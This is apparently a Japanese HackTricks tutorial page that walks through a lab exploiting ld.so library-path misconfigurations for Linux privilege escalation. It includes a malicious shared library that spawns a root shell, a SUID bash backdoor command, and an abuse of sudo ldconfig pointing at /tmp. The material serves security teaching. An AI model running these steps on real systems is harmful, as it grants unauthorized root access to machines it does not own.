# ld.so privesc exploit 例

{{#include ../../banners/hacktricks-training.md}}

## 環境の準備

以下のセクションでは、環境の準備に使用するファイルのコードを確認できます。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. 同じフォルダーにこれらのファイルを**作成**します
2. **library**を**Compile**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`を`/usr/lib`に**Copy**し、cacheを更新します: `sudo cp libcustom.so /usr/lib && sudo ldconfig`（root privs）
4. **executable**を**Compile**します: `gcc sharedvuln.c -o sharedvuln -lcustom`

### environmentを確認する

_libcustom.so_が_/usr/lib_から**loaded**され、binaryを**execute**できることを確認します。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 便利なトリアージコマンド

実際のターゲットを攻撃する際は、バイナリが必要とする**正確なライブラリ名**と、ローダーが**現在解決している内容**を確認します：
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
いくつか役立つ注意点:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` は通常 **機能しません**。
リダイレクトは現在の shell によって実行されるためです。代わりに
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` を使用します。
- **SUID/privileged** バイナリは、**secure-execution mode** では
`LD_LIBRARY_PATH`/`LD_PRELOAD` を無視しますが、
`/etc/ld.so.conf` から読み込まれるディレクトリは、信頼された loader 設定の一部です。
そのため、この misconfiguration は privileged プログラムに依然として影響を与える可能性があります。
- 新しい glibc バージョンでは、dynamic loader は
`--list-diagnostics` も提供しています。hijack が期待どおりに動作しない場合に、
cache の解決や `glibc-hwcaps` サブディレクトリの選択を debug するのに便利です。

## Exploit

このシナリオでは、**誰かが** _/etc/ld.so.conf/_ 内のファイルに
**脆弱なエントリを作成した** と仮定します:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
脆弱なフォルダーは _/home/ubuntu/lib_ です（書き込みアクセスが可能です）。\
そのパス内で以下のコードを**ダウンロードしてコンパイル**します：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
後で **root**（または別の特権アカウント）が脆弱なバイナリを実行すると想定される場合は、インタラクティブシェルを起動する代わりに、通常は **root-owned artifact** を残しておく方が適切です。例：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
その後、特権実行が行われたら、`/tmp/rootbash -p` を使用できます。

**設定ミスのある**パス内に悪意のある libcustom ライブラリを**作成した**ので、**再起動**されるか、root ユーザーが **`ldconfig`** を実行するまで待つ必要があります（_このバイナリを **sudo** として実行できる場合、または **suid bit** が設定されている場合は、自分で実行できます_）。

これが完了したら、`sharedvuln` 実行ファイルが `libcustom.so` ライブラリをどこからロードしているかを**再確認**します：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
ご覧のとおり、**`/home/ubuntu/lib` からロードされており**、いずれかのユーザーが実行すると shell が実行されます。
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> この例ではまだ権限昇格を行っていない点に注意してください。しかし、実行されるコマンドを変更し、**root またはその他の特権ユーザーが脆弱なバイナリを実行するのを待つ**ことで、権限を昇格できるようになります。

### その他の設定ミス - 同じ脆弱性

前の例では、管理者が **`/etc/ld.so.conf.d/` 内の設定ファイルに非特権フォルダーを設定した**という設定ミスを意図的に作成しました。\
しかし、同じ脆弱性を引き起こす可能性のある設定ミスは他にもあります。`/etc/ld.so.conf.d` 内の **設定ファイル**、`/etc/ld.so.conf.d` フォルダー、または `/etc/ld.so.conf` ファイルに **書き込み権限**がある場合、同じ脆弱性を設定して exploit できます。

## Exploit 2

**`ldconfig` に対する sudo 権限があるとします**。\
`ldconfig` **が conf ファイルを読み込む場所を指定できる**ため、それを利用して `ldconfig` に任意のフォルダーを読み込ませることができます。\
そこで、"/tmp" を読み込むために必要なファイルとフォルダーを作成します。
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
ここで、**previous exploit**で示したように、**悪意のあるライブラリを`/tmp`内に作成**します。\
そして最後に、パスを読み込んで、バイナリがどこからライブラリを読み込んでいるかを確認します。
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**ご覧のとおり、`ldconfig` に対する sudo 権限があれば、同じ脆弱性を exploit できます。**



## 参考資料

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
